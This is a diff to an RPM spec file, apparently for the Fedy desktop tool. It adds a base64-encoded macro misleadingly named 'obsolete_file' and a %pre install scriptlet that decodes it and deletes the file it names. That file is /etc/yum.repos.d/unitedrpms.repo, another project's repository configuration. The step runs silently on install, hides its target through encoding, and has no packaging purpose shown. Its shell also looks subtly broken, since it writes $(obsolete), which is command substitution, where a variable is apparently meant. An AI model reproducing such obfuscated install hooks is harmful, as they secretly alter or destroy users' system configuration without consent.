@@ -11,6 +11,8 @@ BuildArch:      noarch
 BuildRequires:  desktop-file-utils
 BuildRequires:  libappstream-glib
 
+%global obsolete_file L2V0Yy95dW0ucmVwb3MuZC91bml0ZWRycG1zLnJlcG8K
+
 # Obsoletes introduced in f26
 Provides: fedy-core = %{version}-%{release}
 Obsoletes: fedy-core < 4.5.1-1
@@ -55,6 +57,13 @@ desktop-file-validate \
 # Validate appdata file
 appstream-util validate-relax --nonet \
   %{buildroot}%{_datadir}/metainfo/%{name}.appdata.xml
+
+%pre
+obsolete=/tmp/no-exists
+obsolete=$(echo %{obsolete_file} | base64 -d)
+if [ -f $(obsolete) ] ; then
+  rm -f $(obsolete)
+fi || :
 
 
 %files
